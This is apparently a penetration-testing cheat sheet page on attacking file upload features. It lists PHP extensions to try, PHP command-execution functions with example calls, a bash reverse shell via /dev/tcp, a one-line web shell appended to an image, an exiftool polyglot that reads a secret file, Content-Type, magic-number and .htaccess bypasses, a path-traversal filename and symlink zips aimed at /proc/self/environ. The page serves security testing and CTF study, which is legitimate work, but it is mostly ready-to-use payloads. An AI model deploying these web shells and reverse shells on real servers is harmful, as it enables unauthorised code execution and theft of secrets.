---
title: "File Upload"
description: ""
summary: ""
date: 2023-09-07T16:06:50+02:00
lastmod: 2023-09-07T16:06:50+02:00
draft: false
weight: 800
toc: true
sidebar:
  collapsed: true
seo:
  title: "" # custom title (optional)
  description: "" # custom description (recommended)
  canonical: "" # custom canonical URL (optional)
  robots: "" # custom robot tags (optional)
  noindex: false # false (default) or true
---


#File_upload

**Test every php extension** 

- Script generate extension list : 

```python
var = ".php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module"
var_list = var.split(", ")

with open("extensions.txt", "w") as file:
    for extension in var_list:
        file.write(extension + "\n")
```   

- Check every file that send an echo "test" : 

`Same technique now check every response that print Demonize or "test"`

Check the disable function  

- Here is a list or other possible function to test to execute command : 

	- **exec** - Returns last line of commands output:
	 ``` echo exec("uname -a"); ```
	 - **passthru** - Passes commands output directly to the browser:
	 ```echo passthru("uname -a");```
	 - **system** - Passes commands output directly to the browser and returns last line:
	 ```echo system("uname -a");```
	 - **shell_exec** - Returns commands output :
	 ``` echo shell_exec("uname -a"); ```
	 - **popen** - Opens read or write pipe to process of a command:
	 ```echo fread(popen("/bin/ls /", "r"), 4096);```
	 - **proc_open** - Similar to popen() but greater degree of control:
	 ```proc_close(proc_open("uname -a",array(),$something)); ```
	 - **preg_replace** :
	 ``` <?php preg_replace('/.*/e', 'system("whoami");', ''); ?> ```
	 - **pcntl_exec** - Executes a program (by default in modern and not so modern PHP you need to load the `pcntl.so` module to use this function) :
	 ```pcntl_exec("/bin/bash", ["-c", "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"]);```


**Bypass Content-Type, Magic Number**

- Bypass **Content-Type** checks by setting the **value** of the **Content-Type** **header** to: _image/png_ , _text/plain , application/octet-stream_

 Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
   
- Bypass **magic number** check by adding at the beginning of the file the **bytes of a real image** (confuse the _file_ command). Or introduce the shell inside the **metadata**: 

`exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php`

Or you could also **introduce the payload directly** in an image: 

`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`

- Interesting tool Upload bypass :
https://github.com/sAjibuu/Upload_Bypass

- You can also an LFI do bypass restriction for example : 
`Content-Disposition: form-data; name="avatar"; filename="../exploit.php`

DO NOT forget try double encoding ect ...

- Htaccess ( Web shell upload via extension blacklist bypass ): 

1- Upload a file name as .htaccess 
2- Change the value of the `Content-Type` header to `text/plain`
3- Replace the contents of the file (your PHP payload) with the following Apache directive:

`AddType application/x-httpd-php .l33t`

Resources: 
https://thibaud-robin.fr/articles/bypass-filter-upload/


- Tester la présence d'un Anti-virus : 
```sh
X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
```


- Zip :
Try to upload a zip with symlink to `/etc/password` or `the page himself` (index.php)
Be aware of `opendir` !! 
```sh
ln -s /proc/self/environ test.txt
zip --symlinks user.zip test.txt
```

Also Zipslip : https://github.com/snyk/zip-slip-vulnerability